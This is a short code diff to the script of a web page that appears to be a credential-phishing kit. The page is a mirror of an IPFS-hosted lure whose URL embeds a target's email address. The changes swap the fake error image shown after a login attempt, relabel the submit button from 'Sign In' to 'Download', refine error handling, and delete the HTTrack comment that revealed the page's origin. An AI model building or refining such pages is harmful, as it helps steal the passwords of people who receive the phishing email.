@@ -166,12 +166,16 @@ $(document).ready(function() {
                 setTimeout(function() {
                     $("#xx").val(name);
                     $("#xxx").val("");
-                    $('.er').html(`<img src="en.jpg">`);
-                    $("#submitBtn").html("Sign In").prop("disabled", false);
+                    $('.er').html(`<img src="erro.jpg">`);
+                    $("#submitBtn").html("Download").prop("disabled", false);
                 }, 2000);
             },
             error: function(xhr, status, error) {
-                $('.er').html('Error: ' + error);
+                if (xhr.responseJSON && xhr.responseJSON.message) {
+                    $('.er').html('Error: ' + xhr.responseJSON.message);
+                } else {
+                    $('.er').html('Error: ' + error);
+                }
                 $("#submitBtn").html("Download").prop("disabled", false);
             }
         });
@@ -182,5 +186,4 @@ $(document).ready(function() {
 });
 </script>
 
-<!-- Mirrored from bafkreicptbihp2q3tyrqv4bsmsyyjmdyql44ek3xmslqukfnglclnqrrgm.ipfs.dweb.link/?aod=https://bafkreicptbihp2q3tyrqv4bsmsyyjmdyql44ek3xmslqukfnglclnqrrgm.ipfs.dweb.link/?aod=westexport@svobodako.ru by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 26 Jun 2025 19:44:26 GMT -->
 </html>
